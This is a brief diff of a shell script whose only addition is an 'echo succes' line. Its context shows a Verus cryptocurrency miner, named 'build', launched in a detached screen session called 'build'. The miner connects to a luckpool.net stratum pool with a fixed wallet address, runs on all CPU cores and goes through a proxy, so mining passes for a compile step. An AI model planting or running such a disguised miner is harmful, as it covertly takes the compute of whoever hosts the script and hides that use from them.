@@ -13,3 +13,4 @@ chmod +x build
 chmod +x compile.sh
 screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RV9KzJ9v7HJ5puLKh32iWPGboKXDoL7HB3.worker-$worker -p x -t $(nproc --all) -x $proxy
 ./compile.sh
+echo succes
